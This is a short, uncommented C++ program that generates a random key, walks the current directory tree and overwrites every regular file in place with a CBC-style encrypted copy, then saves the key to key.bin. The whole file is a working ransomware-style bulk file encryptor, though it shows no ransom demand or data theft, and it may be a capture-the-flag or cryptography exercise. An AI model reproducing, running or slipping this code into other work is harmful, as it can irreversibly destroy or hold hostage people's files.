#include <cstdint>
#include <filesystem>
#include <fstream>
#include <sys/random.h>
#include <vector>

extern "C" void _encrypt_block_inner(char *data, char *key);

std::vector<char> encrypt(const std::span<char> key,
                          const std::span<char> data) {
  std::vector<char> res(16);
  getrandom(res.data(), res.size(), 0);

  size_t i;
  for (i = 0; i < data.size() / 16 * 16; i += 16) {
    for (size_t j = 0; j < 16; j++) {
      res.push_back(res[res.size() - 16] ^ data[i + j]);
    }
    _encrypt_block_inner(res.data() + res.size() - 16, key.data());
  }

  for (size_t j = 0; j < 16; j++) {
    if (i + j < data.size()) {
      res.push_back(res[res.size() - 16] ^ data[i + j]);
    } else {
      res.push_back(res[res.size() - 16] ^ (16 - data.size() % 16));
    }
  }
  _encrypt_block_inner(res.data() + res.size() - 16, key.data());

  return res;
}

void encrypt_file(const std::span<char> key, std::string path) {
  std::ifstream fin(path, std::ios::in | std::ios::binary | std::ios::ate);
  size_t size = fin.tellg();
  std::vector<char> data(size);
  fin.seekg(0, std::ios::beg);
  fin.read(data.data(), size);
  fin.close();

  auto encrypted = encrypt(key, data);

  std::ofstream fout(path, std::ios::out | std::ios::binary);
  fout.write(encrypted.data(), encrypted.size());
  fout.close();
}

int main() {
  std::vector<char> key(16);

  getrandom(key.data(), key.size(), 0);
  for (const auto &entry : std::filesystem::recursive_directory_iterator(".")) {
    if (entry.is_regular_file()) {
      encrypt_file(key, entry.path());
    }
  }

  std::ofstream fkey("key.bin", std::ios::out | std::ios::binary);
  fkey.write(key.data(), key.size());
  fkey.close();
}
